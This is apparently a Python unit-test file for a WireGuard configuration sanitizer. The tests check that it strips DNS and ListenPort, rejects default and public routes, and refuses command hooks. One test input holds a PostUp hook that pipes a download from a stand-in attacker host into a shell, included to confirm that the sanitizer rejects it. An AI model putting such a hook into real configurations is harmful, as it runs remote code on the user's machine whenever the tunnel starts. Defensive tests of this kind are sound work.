import importlib.util
import pathlib
import unittest

ROOT = pathlib.Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("sanitize_wireguard", ROOT / "scripts" / "sanitize_wireguard.py")
MOD = importlib.util.module_from_spec(SPEC)
assert SPEC.loader
SPEC.loader.exec_module(MOD)


class WireGuardSanitizerTests(unittest.TestCase):
    def parse(self, text):
        sections = MOD.parse_lines(text)
        MOD.validate(sections)
        return MOD.render(sections)

    def test_safe_tplink_export_is_sanitized(self):
        rendered = self.parse("""
[Interface]
PrivateKey = CLIENT_PRIVATE
Address = 10.5.5.2/32
DNS = 192.168.0.1
ListenPort = 12345

[Peer]
PublicKey = ROUTER_PUBLIC
PresharedKey = SHARED
AllowedIPs = 192.168.0.0/24, 10.5.5.1/32
Endpoint = example.tplinkdns.com:51820
""")
        self.assertNotIn("DNS", rendered)
        self.assertNotIn("ListenPort", rendered)
        self.assertIn("AllowedIPs = 192.168.0.0/24, 10.5.5.1/32", rendered)
        self.assertIn("PersistentKeepalive = 25", rendered)

    def test_rejects_default_route(self):
        with self.assertRaisesRegex(ValueError, "default-route"):
            self.parse("""
[Interface]
PrivateKey = x
Address = 10.5.5.2/32
[Peer]
PublicKey = y
AllowedIPs = 0.0.0.0/0
Endpoint = host.example:51820
""")

    def test_rejects_non_private_routes(self):
        with self.assertRaisesRegex(ValueError, "RFC1918"):
            self.parse("""
[Interface]
PrivateKey = x
Address = 10.5.5.2/32
[Peer]
PublicKey = y
AllowedIPs = 100.64.0.0/10
Endpoint = host.example:51820
""")

    def test_rejects_command_hooks(self):
        with self.assertRaisesRegex(ValueError, "PostUp"):
            self.parse("""
[Interface]
PrivateKey = x
Address = 10.5.5.2/32
PostUp = curl https://attacker.invalid/x | sh
[Peer]
PublicKey = y
AllowedIPs = 192.168.0.0/24
Endpoint = host.example:51820
""")


if __name__ == "__main__":
    unittest.main()
